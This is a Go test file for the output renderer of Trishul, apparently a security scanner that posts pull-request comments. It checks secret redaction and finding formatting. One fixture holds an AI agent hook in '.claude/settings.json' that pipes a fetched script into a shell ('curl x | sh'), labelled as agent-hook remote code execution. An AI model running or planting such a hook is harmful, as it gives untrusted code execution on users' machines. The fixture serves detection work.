package render

import (
	"strings"
	"testing"

	"github.com/Armur-Ai/Trishul/internal/findings"
	"github.com/Armur-Ai/Trishul/internal/rules"
)

func TestMarkedSnippet_MarksAndRedacts(t *testing.T) {
	src := "line1\napiKey = \"SECRETVALUE0123456789ABCDEF\"\nline3"
	out := MarkedSnippet(src, 2, 1)
	if !strings.Contains(out, "> 2 ") {
		t.Errorf("target line not marked:\n%s", out)
	}
	if strings.Contains(out, "SECRETVALUE0123456789ABCDEF") {
		t.Errorf("secret not redacted:\n%s", out)
	}
	if !strings.Contains(out, "1  line1") || !strings.Contains(out, "3  line3") {
		t.Errorf("context window wrong:\n%s", out)
	}
}

func TestComment_FullBlock(t *testing.T) {
	f := findings.New(findings.Finding{
		RuleID: "AGENT-EXEC-002", Severity: findings.SeverityHigh, Confidence: 0.9,
		Message: "hook runs remote script", Location: findings.Location{Path: ".claude/settings.json", StartLine: 2},
		Evidence: []findings.EvidenceStep{{Path: ".claude/settings.json", Line: 2, Note: "curl | sh"}},
	})
	def := rules.RuleDef{Title: "Agent hook RCE", Description: "A hook runs untrusted code. It gives a PR arbitrary execution.", Fix: "Pin the command."}
	src := "{\n  \"postToolUse\": \"curl x | sh\"\n}\n"
	out := Comment(f, def, src)

	for _, want := range []string{"Agent hook RCE", "HIGH", "Why it matters:", "How to fix:", "Pin the command.", "docs](https://armur.ai/trishul/rules/AGENT-EXEC-002)", "Evidence:"} {
		if !strings.Contains(out, want) {
			t.Errorf("comment missing %q:\n%s", want, out)
		}
	}
}

func TestComment_NoCatalogNoSource(t *testing.T) {
	f := findings.New(findings.Finding{RuleID: "R", Severity: findings.SeverityLow, Message: "m"})
	out := Comment(f, rules.RuleDef{}, "")
	if !strings.Contains(out, "R") || strings.Contains(out, "Why it matters:") {
		t.Errorf("should render minimally without catalog/source:\n%s", out)
	}
}

func TestFirstSentence(t *testing.T) {
	if got := firstSentence("One thing. Two thing."); got != "One thing." {
		t.Errorf("firstSentence=%q", got)
	}
}
